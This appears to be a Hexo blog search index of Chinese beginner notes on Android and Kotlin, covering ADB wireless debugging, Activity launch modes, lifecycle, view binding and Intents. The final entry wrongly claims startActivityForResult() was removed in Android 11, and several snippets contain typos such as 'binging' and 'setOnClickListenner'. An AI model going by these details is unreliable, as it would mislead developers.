<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>0xffffffff颜色值是怎么读的</title>
    <url>/posts/5c4b5651/</url>
    <content><![CDATA[<p>平常看到的大多数是十六进制的，#f5f5f5。</p>
<p>但是在自定义控件的时候，有些地方使用了像0xffffffff，这些设置颜色，在百度给的也不太明确，后来查找发现，原来是</p>
<p>在C语言中十六进制数必需以0x开头，以0x开头的数即表明它是一个十六进制的数，真正的数是0x后的值，所以，这种颜色值，0x不用管，接着的两位数ff是表示透明度，再接着的六位数就是平常看的#ffffff了。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>5开发原则</title>
    <url>/posts/bd59f981/</url>
    <content><![CDATA[<p>SOLID<br>Single responsibility 单一职责<br>Open close principle 开闭原则<br>Lisk of substitution 替换原则（能被子类替代使用）<br>Interface segregation 接口隔离<br>Dependences 依赖抽象而不是具体</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>ADB 调试手机的三种方式（USB、WLAN、WIFI）</title>
    <url>/posts/b47efec3/</url>
    <content><![CDATA[<p>主要是，家里多了一些旧手机时，可以用这些旧手机来开发App，可是这些手机Android版本过低，只有USB调试，不支持无限调试。所以可以通过这种方式打开无限调试的开关。来达到无限调试的目的。</p>
<h1 id="USB-调试"><a href="#USB-调试" class="headerlink" title="USB 调试"></a>USB 调试</h1><p>手机开启开发者选项和 USB 调试模式（通常开启方式：在关于手机连续点击7次版本号）；<br>USB 连接线和各种接口正常（个别三方数据线仅支持充电，不支持调试）；<br>驱动状态正常（Linux 和 Mac 通常没有问题，Windows 可能需要安装）；<br><code>adb devices -l</code>命令查看。</p>
<h1 id="WLAN-调试（Android-10-及更低版本，需要借助-USB）"><a href="#WLAN-调试（Android-10-及更低版本，需要借助-USB）" class="headerlink" title="WLAN 调试（Android 10 及更低版本，需要借助 USB）"></a>WLAN 调试（Android 10 及更低版本，需要借助 USB）</h1><p>Android 10以及更低的版本，必须通过 USB 连接后，才可实现同一 WLAN 下无线调试。</p>
<p>手机和电脑需连接在同一 WiFi 下；<br>手机开启开发者选项和 USB 调试模式，并通过 USB 连接电脑（即adb devices -l可以查看到手机）；<br>设置手机的监听adb tcpip 5555;<br>拔掉 USB 线，找到手机的 IP 地址;<br>通过 IP 连接到手机adb connect ip（端口默认：5555）;<br><code>adb devices -l</code>命令查看。</p>
<h1 id="Wi-Fi-调试（Android-11-及更高版本，无需借助-USB）"><a href="#Wi-Fi-调试（Android-11-及更高版本，无需借助-USB）" class="headerlink" title="Wi-Fi 调试（Android 11 及更高版本，无需借助 USB）"></a>Wi-Fi 调试（Android 11 及更高版本，无需借助 USB）</h1><p>从 Android 11 开始支持 ADB 以无线方式连接手机调试，可以彻底摆脱 USB 线。</p>
<p>手机和电脑需连接在同一 WiFi 下；<br>保证 SDK 为最新版本（adb –version ≥ 30.0.0）；<br>手机启用开发者选项和无线调试模式（会提示确认）；<br>允许无线调试后，选择使用配对码配对。记下显示的配对码、IP 地址和端口号；<br>运行<code>adb pair ip:port</code>，使用第 4 步中的 IP 地址和端口号；<br>根据提示，输入第 3 步中的配对码，系统会显示一条消息，表明您的设备已成功配对；<br>（仅适用于 Linux 或 Windows）运行 <code>adb connect ip:port</code>。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>adb调试</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity启动模式</title>
    <url>/posts/49b5653f/</url>
    <content><![CDATA[<p><strong>Activity有四种启动模式</strong><br>你可以在<code>AndroidManifest.xml</code>中通过给<code>&lt;activity&gt;</code>标签指定<code>android:launchMode</code>来选择启动模式</p>
<h2 id="standard"><a href="#standard" class="headerlink" title="standard"></a>standard</h2><p>他是默认的启动模式，在不进行显示指定的情况下，会自动使用这种启动模式。他的操作就是，每次启动一个新的activity都会直接调用<code>onCreate()</code>创建一个新的实例，然后置于返回栈栈顶。<br>这样的确定是，即便是同一个页面，也可能会产生很多个，然后叠加，产生资源的浪费。</p>
<h2 id="singleTop"><a href="#singleTop" class="headerlink" title="singleTop"></a>singleTop</h2><p>解决标准模式的部分问题：他的操作为：在启动Activity时，如果发现该Activity已经处于栈顶时，系统将会直接使用它，而不是创建新的Activity实例。<br>当然，如果栈顶换了新的activity时，他就会是标准模式。</p>
<h2 id="singleTask"><a href="#singleTask" class="headerlink" title="singleTask"></a>singleTask</h2><p>这里的启动模式意味着，该Activity是一个单例模式，在整个返回栈中都只会有这一个。操作：当启动这个<code>Activity</code>时，系统会检查返回栈中是否存在这个<code>Activity</code>的实例，如果不存在，将会创建该实例，如果存在，那么系统会将返回栈中这个Activity之上的所有activity都出栈并销毁，使这个Activity处于栈顶。</p>
<h2 id="singleInstance"><a href="#singleInstance" class="headerlink" title="singleInstance"></a>singleInstance</h2><p>他的使用场景：存在多个应用程序都可以共用这个<code>Activity</code>，而前三个启动模式都做不到，因为每个应用程序都有自己的返回栈，同一个<code>Activity</code>在不同的返回栈时，必然会创建不同的实例。<br>因此该启动方式会有一个单独的返回栈来管理这个Activity。不管哪个应用访问这个<code>Activity</code>都会公用这个返回栈。<br><img src="https://image.zfxt.top/hexo-blog/Activity%E5%90%AF%E5%8A%A8%E6%A8%A1%E5%BC%8F-2023-06-09-05-06.png"></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity更替（视图绑定）</title>
    <url>/posts/81c5b9b9/</url>
    <content><![CDATA[<ul>
<li><p>kotin已经是google官宣的第一android开发语言。<br>在android开发中，经常需要在<code>activity</code>中去获取某个具体的View属性，一般可以通过<code>findViewById(R.id.button1)</code>的方法来获取View，从而实现具体的逻辑变化。</p>
<blockquote>
<p>但是一直使用findViewById()非常不利于代码的整洁性和可观性，因此可以采用视图绑定的方法来简化操作。</p>
</blockquote>
</li>
<li><p>在原先的kotlin开发中，他可以通过插件<code>apply plugin: &#39;kotlin-android-extensions&#39;已经被弃用</code>来实现简单的视图绑定。现在这个插件已经被废除，需要使用其他方法</p>
</li>
</ul>
<ol>
<li>视图绑定<br>在app目录下的<code>build.gradle</code>配置文件中填入一下内容<br><img src="https://image.zfxt.top/hexo-blog/Activity%E6%9B%B4%E6%9B%BF%EF%BC%88%E8%A7%86%E5%9B%BE%E7%BB%91%E5%AE%9A%EF%BC%89-2023-06-10-52-39.png"></li>
</ol>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">android &#123; ... viewBinding &#123; enabled = <span class="literal">true</span> &#125; &#125;</span><br></pre></td></tr></table></figure>
<p>然后就可以便携的在<code>activity</code>中使用视图绑定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">    binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line"><span class="comment">//ActivityMainBinding是你的类的，layoutInflater是你需要绑定的视图，</span></span><br><span class="line">    setContentView(binding.root)</span><br><span class="line">	binging.button1.setClick&#123;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完成视图绑定后，可以直接通过bingding.属性来获取属性并实现逻辑功能。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity最佳实践</title>
    <url>/posts/fb710795/</url>
    <content><![CDATA[<h2 id="知晓当前时哪一个activity"><a href="#知晓当前时哪一个activity" class="headerlink" title="知晓当前时哪一个activity"></a>知晓当前时哪一个activity</h2><p>直接创建一个kotlin的类，，他与Activity的创建方法不一样。<br>创建BaseActivity类<br><img src="https://image.zfxt.top/hexo-blog/Activity%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-2023-06-19-39-59.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">open <span class="keyword">class</span> <span class="title class_">BaseActivity</span>:AppCompatActivity() &#123;</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        Log.d(<span class="string">&quot;BaseActivity&quot;</span>,javaClass.simpleName)</span><br><span class="line">        <span class="comment">//javaClass表示获取当前实例的class对象，相当于在java中调用getClass方法</span></span><br><span class="line">        <span class="comment">//::class.java表示获取BaseActivity类的Class对象。相当于在Java中调用BaseActivity.class反射</span></span><br><span class="line">        ActivityCollector.addActivity(<span class="built_in">this</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后在把其他的类从继承AppCompatActivity改为BaseActivity。这样，每个Activity在启动时，都会继承父类的方法，然后输出他的类名。就可以知晓当前是哪个Activity</p>
<h2 id="随时随地退出程序"><a href="#随时随地退出程序" class="headerlink" title="随时随地退出程序"></a>随时随地退出程序</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//所有activity的集合</span></span><br><span class="line"><span class="comment">//单例模式</span></span><br><span class="line">object ActivityCollector&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">val</span> <span class="variable">actvities</span> <span class="operator">=</span> ArrayList&lt;Activity&gt;()</span><br><span class="line">    fun <span class="title function_">addActivity</span><span class="params">(activity: Activity)</span>&#123;</span><br><span class="line">        actvities.add(activity)</span><br><span class="line">    &#125;</span><br><span class="line">    fun <span class="title function_">removeActivity</span><span class="params">(activity: Activity)</span>&#123;</span><br><span class="line">        actvities.remove(activity)</span><br><span class="line">    &#125;</span><br><span class="line">    fun <span class="title function_">finishAll</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(activity in actvities)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!activity.isFinishing)</span><br><span class="line">                activity.finish()</span><br><span class="line">        &#125;</span><br><span class="line">        actvities.clear()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用这个单例，在每个onCreate()方法执行时，调用addActivity()，然后在每个onDestroy()方法中，调用removeActivity()方法。<br>然后可以绑定一个案件绑定finishAll()一次性关闭所有的Activity。</p>
<h2 id="启动Activity的最佳写法"><a href="#启动Activity的最佳写法" class="headerlink" title="启动Activity的最佳写法"></a>启动Activity的最佳写法</h2><p>一般启动Activity的方法，就是通过调用<code>startActivity()</code>或者<code>startforResult()</code>来将Activiyty启动起来。<br>但如果启动另一个Activity需要传入参数的话，往往需要查看文档或者问其开发人员。而这就会降低效率。<br>这里推荐到最佳写法就是将启动类封装在一个kotlin的伴生类中，（类似静态方法)。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ActivitySecond</span> : BaseActivity() &#123;</span><br><span class="line">    companion object&#123;</span><br><span class="line">        fun <span class="title function_">actionStart</span><span class="params">(context: Context,data1:String,data2:String)</span>&#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(context,ActivitySecond::class.java)</span><br><span class="line">            intent.putExtra(<span class="string">&quot;data1&quot;</span>,data1)</span><br><span class="line">            intent.putExtra(<span class="string">&quot;data2&quot;</span>,data2)</span><br><span class="line">            context.startActivity(intent)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在需要启动<code>ActivitySecond</code>的地方，调用该方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ActivitySecond.actionStart(<span class="built_in">this</span>,<span class="string">&quot;data1&quot;</span>,<span class="string">&quot;data2&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>来启动这个方法。这样就把上下文参数和数据都传过去了。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity生命周期</title>
    <url>/posts/b44bf942/</url>
    <content><![CDATA[<h2 id="返回栈"><a href="#返回栈" class="headerlink" title="返回栈"></a>返回栈</h2><ul>
<li>Activity是可层叠的，每启动一个新的Activity，都会覆盖在原Activity中。然后每次点击返回时，都会销毁掉最上面的Activity。下面的Activity就会重新显示是出来。<br><img src="https://image.zfxt.top/hexo-blog/Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F-2023-06-05-01-39.png"></li>
</ul>
<h2 id="Activity状态"><a href="#Activity状态" class="headerlink" title="Activity状态"></a>Activity状态</h2><ol>
<li>运行状态<br>当一个Activity位于返回栈的栈顶时，Activity就处于运行状态。系统最不愿意回收的就是<br>处于运行状态的Activity，因为这会带来非常差的用户体验。</li>
<li>暂停状态<br>当一个Activity不再处于栈顶位置，但仍然可见时，Activity就进入了暂停状态。你可能会<br>觉得，既然Activity已经不在栈顶了，怎么会可见呢？这是因为并不是每一个Activity都会<br>占满整个屏幕，比如对话框形式的Activity只会占用屏幕中间的部分区域。处于暂停状态的<br>Activity仍然是完全存活着的，系统也不愿意回收这种Activity（因为它还是可见的，回收<br>可见的东西都会在用户体验方面有不好的影响），只有在内存极低的情况下，系统才会去<br>考虑回收这种Activity。</li>
<li>停止状态<br>当一个Activity不再处于栈顶位置，并且完全不可见的时候，就进入了停止状态。系统仍然<br>会为这种Activity保存相应的状态和成员变量，但是这并不是完全可靠的，当其他地方需要<br>内存时，处于停止状态的Activity有可能会被系统回收。</li>
<li>销毁状态<br>一个Activity从返回栈中移除后就变成了销毁状态。系统最倾向于回收处于这种状态的<br>Activity，以保证手机的内存充足。</li>
</ol>
<h3 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h3><p><img src="https://image.zfxt.top/hexo-blog/Activity%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F-2023-06-09-56-53.png"></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity的使用（1）</title>
    <url>/posts/115e430b/</url>
    <content><![CDATA[<h2 id="Activity的概念"><a href="#Activity的概念" class="headerlink" title="Activity的概念"></a>Activity的概念</h2><p>他是一种可以包含用户组界面的组件。他就是一个app的门面，所有可见的内容都是在<code>activity</code>中定义的。</p>
<h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h3><p>每个Activity都需要绑定一个布局文件<code>layout</code>以及必须在<code>AndroidManifest</code>注册。</p>
<ul>
<li>在layout布局文件中，每个元素都应该有一个唯一的id作为标识符。<br>例如：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span> <span class="attr">androd:id</span>=<span class="string">&quot;@+id/button1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Button</span>&gt;</span></span><br></pre></td></tr></table></figure>
这种特殊的id命名方法，当去掉+号，即<code>@id/button1</code>，就是在xml中引入资源的语法。如果你需要在xml中定义一个id就需要使用@+id&#x2F;id_name这中语法。</li>
<li>在activity中绑定这个layout文件，只需要使用<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setContentView(R.layout.first_layout)</span><br><span class="line"><span class="comment">//R.layout.first_layout是activity实例调用xml资源的书写方法，他采用.的方式来获取</span></span><br></pre></td></tr></table></figure>
通过<code>setContenView</code>来绑定这个布局文件</li>
<li>在AndroidManifest中注册这个activity<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.FirstActivity&quot;</span></span></span><br><span class="line"><span class="tag">	<span class="attr">android:label</span>=<span class="string">&quot;This is FirstActivity&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
在上述配置文件中<table>
<thead>
<tr>
<th align="left">内容</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">name</td>
<td align="left">用来唯一的标识某个activity。</td>
</tr>
<tr>
<td align="left">lable</td>
<td align="left">如果具体的activity设置了lable，那么视图部分将会展现activity内的lable，不然就会默认展示aplication的lable</td>
</tr>
<tr>
<td align="left">intent-filter</td>
<td align="left">用来添加额外的属性</td>
</tr>
<tr>
<td align="left">action</td>
<td align="left">表明该类会响应什么样的启动事件</td>
</tr>
<tr>
<td align="left">catogory</td>
<td align="left">表明这个activity更加具体的响应类型</td>
</tr>
</tbody></table>
</li>
</ul>
<p>在这个实际的activity中，action和category用来表明这个实体类为启动类<br>以上配置完成后，就完成了最基本的配置内容了</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Activity的跳转</title>
    <url>/posts/a4e34b71/</url>
    <content><![CDATA[<h2 id="activity的销毁"><a href="#activity的销毁" class="headerlink" title="activity的销毁"></a>activity的销毁</h2><p>只要调用finish()方法即可销毁activity。</p>
<h1 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h1><p>intent是Android程序中各组件之间进行交互的一种重要方式，不仅可以指定当前组件要执行的动作，也可以在不同组件传递数据。</p>
<h2 id="activity的跳转"><a href="#activity的跳转" class="headerlink" title="activity的跳转"></a>activity的跳转</h2><ul>
<li>显式跳转，直接确定跳转的类，然后进行跳转</li>
<li>隐式跳转，设定好被跳转activity的响应事件和类别，然后通过触发对应的intent和category进行跳转。</li>
</ul>
<ol>
<li>显示跳转<br>Intent有很多构造参数，这里我们选用一个<code>Intent(Context packageContext,Class&lt;?&gt; cls)</code><br>第一个参数需要一个启动的上下文，而我们的Activity实例就是一个context。第二个参数就是要跳转的目的类（他需要接受一个java的类）<br>例如：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListenner&#123;</span><br><span class="line">	<span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>,SecondActivity::class.java)</span><br><span class="line">	<span class="comment">//先构造一个intent</span></span><br><span class="line">	startActivity(intent)</span><br><span class="line">	<span class="comment">//通过这个intent启动一个Activity</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>隐式跳转<br>隐式跳转并不需要指定想要启动哪一个类，而是指定了一些列更为抽象的action和category等信息，然后交由系统分析。<br>一般通过在AndroidManifest.xml中添加一个<code>&lt;intent-filter&gt;&lt;/intent-filter&gt;</code>标签来实现。<br>例如：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.SecondActivity&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;top.zfxt.activitytest.ACTION_START&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
以上内容表示该类会接受一个ACTION_START的启动事件，而且会有一个默认的category，这是所有启动事件都有的默认的启动参数。<br>然后需要启动这个类的话<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListenner&#123;</span><br><span class="line">	<span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="string">&quot;top.zfxt.activitytest.ACTION_START&quot;</span>)</span><br><span class="line">	startActivity(intent)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
如此就可以实现隐式跳转</li>
</ol>
<h3 id="更多intent的用法"><a href="#更多intent的用法" class="headerlink" title="更多intent的用法"></a>更多intent的用法</h3><pre><code>1. 每个intent只能指定一个action，但是可以指定多个category。因此通过category来实现具体跳转的activity。
</code></pre>
<p>例如：<br>在AndroidManifest.xml中添加<code>&lt;category android:name=&quot;top.zfxt.activitytest.MY_CATEGORY&quot;&gt;</code><br>然后在实例中<code>intent.addCategory(&quot;top.zfxt.activitytest.MY_CATEGORY&quot;)</code>之后才能正确跳转。<br>    2. 隐式Intent，不仅可以启动自己程序内的Activity，还能启动其他程序的Activity，这使得多个应用程序共享之间的功能成为可能。<br>继续使用上面的button1作为示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListener&#123;</span><br><span class="line">	<span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(Intent.ACTION_VIEW)</span><br><span class="line">	intent.data = Uri.parse(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">	startActivity(intent)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上内容指定了<code>action</code>是<code>Intent.ACTION_VIEW</code>,然后通过<code>Uri.parse()</code>方法将地址字符解析成一个Uri对象，<br>然后传递给intent.data。<br>与此相对应的，在<intent-filter></intent-filter>标签中也可以在配置一个<data></data>对象，包含以下内容</p>
<table>
<thead>
<tr>
<th>标签</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>android:scheme</td>
<td>用于指定数据的协议部分，如：https</td>
</tr>
<tr>
<td>android:host</td>
<td>用于指定数据的主机名</td>
</tr>
<tr>
<td>android:port</td>
<td>用于指定数据的端口部分</td>
</tr>
<tr>
<td>android:path</td>
<td>用于指定访问的具体资源路径</td>
</tr>
<tr>
<td>android:mimeType</td>
<td>用于指定可以处理的数据类型，支持用通配符的方式</td>
</tr>
</tbody></table>
<p>上述<code>Intent.ACTION_VIEW</code>是可以调用浏览器的一个启动事件，当然我们也可以自己定义一个activity，用隐式intent的方式，去接受这个启动事件，但我们不一定能够解析他，只是调用而已。<br>类似的还有<br>Intent.ACTION_DIAL<br>tel:10086<br>这一串数据可以调用电话簿，并且拨打电话给10086。</p>
<h2 id="传递数据"><a href="#传递数据" class="headerlink" title="传递数据"></a>传递数据</h2><ol>
<li><p>向下一个activity传递数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">button1.setOnClickListenner&#123;</span><br><span class="line">	<span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>,SecondActivity::class.java)</span><br><span class="line">	intent.putExtra(<span class="string">&quot;extra_data&quot;</span>,<span class="string">&quot;This is a Test&quot;</span>)</span><br><span class="line">	startActivity(intent)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过重载putExtra()方法，将内容暂存到intent中，然后通过键值对取出该数据。<br>然后在另一个被启动的activity中取出数据</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">onCreate(savedInstanceState:Bundle?)&#123;</span><br><span class="line">	...</span><br><span class="line">	<span class="type">val</span> <span class="variable">extraData</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;extra_data&quot;</span>)</span><br><span class="line">	Log.d(<span class="string">&quot;SecondActivity&quot;</span>,<span class="string">&quot;extra data is $extraData&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过getStringExtra()方法获取相应的键值，同理，对应的数据类型采用相应的方法如getIntExtra(),getBooleanExtra()等</p>
</li>
<li><p>返回数据给上一个activity</p>
<blockquote>
<p>startActivityForResult()主要是这个方法，但是这个方法已经弃用，等我学了新的再来补充。</p>
</blockquote>
</li>
</ol>
<ul>
<li>registerForActivityResult()<br>在 Android 开发中，<code>startActivityForResult()</code> 方法在 Android 10（API 级别 29）中已被弃用，而且在 Android 11（API 级别 30）及更高版本中已完全移除。代替它的方法是使用 <code>registerForActivityResult()</code>。这个新的 API 提供了更加简洁和灵活的方式来处理活动返回结果。</li>
</ul>
<p>下面是详细的步骤来使用 <code>registerForActivityResult()</code>：</p>
<p>步骤 1：在 Activity 或 Fragment 中定义一个 <code>ActivityResultLauncher</code> 对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> lateinit <span class="keyword">var</span> someActivityResultLauncher: ActivityResultLauncher&lt;Intent&gt;</span><br></pre></td></tr></table></figure>
<p>步骤 2：在 onCreate() 方法中，为 ActivityResultLauncher 对象赋值并指定回调逻辑。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">someActivityResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) &#123; result -&gt;</span><br><span class="line">    <span class="comment">// 在这里处理活动返回的结果</span></span><br><span class="line">    <span class="keyword">if</span> (result.resultCode == Activity.RESULT_OK) &#123;</span><br><span class="line">        <span class="comment">// 处理成功的逻辑</span></span><br><span class="line">        val data: Intent? = result.data</span><br><span class="line">        <span class="comment">// 从 data 中获取数据</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 处理失败的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>步骤 3：在需要启动另一个活动的地方，使用 someActivityResultLauncher 启动活动。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>, AnotherActivity::class.java)</span><br><span class="line">someActivityResultLauncher.launch(intent)</span><br></pre></td></tr></table></figure>

<p>步骤 4：在另一个活动中，当需要返回结果时，使用 setResult() 方法设置结果并关闭活动。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">resultIntent</span> <span class="operator">=</span> Intent()</span><br><span class="line">resultIntent.putExtra(<span class="string">&quot;key&quot;</span>, value)</span><br><span class="line">setResult(Activity.RESULT_OK, resultIntent)</span><br><span class="line">finish()</span><br></pre></td></tr></table></figure>
<p>这就是使用 registerForActivityResult() 方法来替代 startActivityForResult() 的基本步骤。现在，让我们来看一个完整的示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : AppCompatActivity() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> lateinit <span class="keyword">var</span> someActivityResultLauncher: ActivityResultLauncher&lt;Intent&gt;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContentView(R.layout.activity_main)</span><br><span class="line"></span><br><span class="line">        someActivityResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) &#123; result -&gt;</span><br><span class="line">            <span class="keyword">if</span> (result.resultCode == Activity.RESULT_OK) &#123;</span><br><span class="line">                val data: Intent? = result.data</span><br><span class="line">                <span class="type">val</span> <span class="variable">value</span> <span class="operator">=</span> data?.getStringExtra(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">                <span class="comment">// 处理返回的结果</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 处理失败的逻辑</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">val</span> <span class="variable">button</span> <span class="operator">=</span> findViewById&lt;Button&gt;(R.id.button)</span><br><span class="line">        button.setOnClickListener &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">intent</span> <span class="operator">=</span> Intent(<span class="built_in">this</span>, AnotherActivity::class.java)</span><br><span class="line">            someActivityResultLauncher.launch(intent)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AnotherActivity</span> : AppCompatActivity() &#123;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">(savedInstanceState: Bundle?)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        setContentView(R.layout.activity_another)</span><br><span class="line"></span><br><span class="line">        <span class="type">val</span> <span class="variable">button</span> <span class="operator">=</span> findViewById&lt;Button&gt;(R.id.button)</span><br><span class="line">        button.setOnClickListener &#123;</span><br><span class="line">            <span class="type">val</span> <span class="variable">resultIntent</span> <span class="operator">=</span> Intent()</span><br><span class="line">            resultIntent.putExtra(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;Some data&quot;</span>)</span><br><span class="line">            setResult(Activity.RESULT_OK, resultIntent)</span><br><span class="line">            finish()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个示例中，点击 MainActivity 中的按钮会启动 AnotherActivity，然后 AnotherActivity 在返回结果之前关闭自身并设置了返回结果。MainActivity 中的 someActivityResultLauncher 的回调函数会在返回结果时被触发，你可以在回调函数中处理返回的结果数据。</p>
